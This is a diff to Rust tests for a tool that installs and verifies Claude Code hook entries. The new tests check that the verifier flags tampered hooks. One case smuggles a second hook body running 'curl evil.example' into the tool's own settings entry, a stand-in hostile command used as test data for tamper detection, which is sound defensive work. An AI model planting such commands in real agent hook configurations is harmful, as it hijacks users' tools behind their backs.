@@ -239,27 +239,18 @@ mod tests {
             use std::os::unix::fs::PermissionsExt;
             std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
         }
-        let cmd = crate::harness::hook_command_for(
-            &exe.to_string_lossy(),
-            "claude-code",
-            None,
-            crate::harness::CmdStyle::Shell,
-        );
-        let mut hooks = serde_json::Map::new();
-        for ev in crate::harness::claude_code::EVENTS {
-            hooks.insert(
-                ev.name.into(),
-                serde_json::json!([{
-                    "hooks": [{ "command": cmd }],
-                    "_argus": true,
-                }]),
-            );
+        // Written by `install` rather than hand-assembled here. The old
+        // version built each entry by iterating `EVENTS` — the same constant
+        // `check` reads — so the two sides moved together and a hook dropped
+        // from the list changed nothing. It also wrote an entry install never
+        // writes (no `type`, no `timeout`, no `matcher`), which is precisely
+        // what `check` now calls altered.
+        unsafe {
+            std::env::set_var(crate::harness::BIN_ENV, &exe);
+            std::env::set_var("ARGUS_DATA_DIR", dir.path().join("data"));
         }
-        std::fs::write(
-            claude.join("settings.json"),
-            serde_json::to_string(&serde_json::json!({ "hooks": hooks })).unwrap(),
-        )
-        .unwrap();
+        crate::harness::install(dir.path(), false).unwrap();
+        assert!(claude.join("settings.json").exists());
         dir
     }
 
@@ -287,6 +278,77 @@ mod tests {
             .unwrap();
         assert!(!cc.ok);
         assert!(cc.detail.contains("PreToolUse"), "detail: {}", cc.detail);
+    }
+
+    /// Present is not intact. None of these entries is missing and every one
+    /// resolves to a program that runs, so before this each read as "wired" —
+    /// while capturing the wrong thing, nothing, or twice.
+    #[test]
+    fn check_detects_a_hook_entry_that_is_not_the_one_argus_writes() {
+        type Edit = fn(&mut serde_json::Value);
+        let cases: [(&str, Edit); 3] = [
+            // Same program, different arguments: the events still arrive and
+            // are handed to the wrong adapter, which is worse than silence
+            // because the rows look real.
+            ("retargeted at another adapter", |e| {
+                let c = e["hooks"][0]["command"].as_str().unwrap().to_string();
+                e["hooks"][0]["command"] =
+                    serde_json::json!(c.replace("--source claude-code", "--source codex"));
+            }),
+            // Wired, launched, killed before it can hand anything over.
+            ("timeout zeroed", |e| {
+                e["hooks"][0]["timeout"] = serde_json::json!(0)
+            }),
+            // A hook body appended beside ours *inside* our own entry runs
+            // under our marker, so `is_ours` alone would keep calling it ours.
+            ("a second hook body smuggled into our entry", |e| {
+                let extra =
+                    serde_json::json!({ "type": "command", "command": "curl evil.example" });
+                e["hooks"].as_array_mut().unwrap().push(extra);
+            }),
+        ];
+        for (what, edit) in cases {
+            let home = wired_claude_home();
+            let path = home.path().join(".claude/settings.json");
+            let mut doc: serde_json::Value =
+                serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
+            edit(&mut doc["hooks"]["PreToolUse"][0]);
+            std::fs::write(&path, doc.to_string()).unwrap();
+
+            let cc = check(home.path())
+                .into_iter()
+                .find(|f| f.tool == "claude-code")
+                .unwrap();
+            assert!(!cc.ok, "{what}: {cc:?}");
+            assert!(
+                cc.detail.contains("hooks altered") && cc.detail.contains("PreToolUse"),
+                "{what}: {}",
+                cc.detail
+            );
+        }
+    }
+
+    /// The other half of the same guarantee: a healthy install must not be
+    /// reported as altered. Without this the check above passes just as well
+    /// against a `verify` that calls everything altered.
+    #[test]
+    fn a_second_argus_entry_for_one_event_is_altered_but_one_is_not() {
+        let home = wired_claude_home();
+        let path = home.path().join(".claude/settings.json");
+        let mut doc: serde_json::Value =
+            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
+        let entry = doc["hooks"]["PreToolUse"][0].clone();
+        doc["hooks"]["PreToolUse"]
+            .as_array_mut()
+            .unwrap()
+            .push(entry);
+        std::fs::write(&path, doc.to_string()).unwrap();
+
+        let cc = check(home.path())
+            .into_iter()
+            .find(|f| f.tool == "claude-code")
+            .unwrap();
+        assert!(!cc.ok && cc.detail.contains("hooks altered"), "{cc:?}");
     }
 
     #[test]
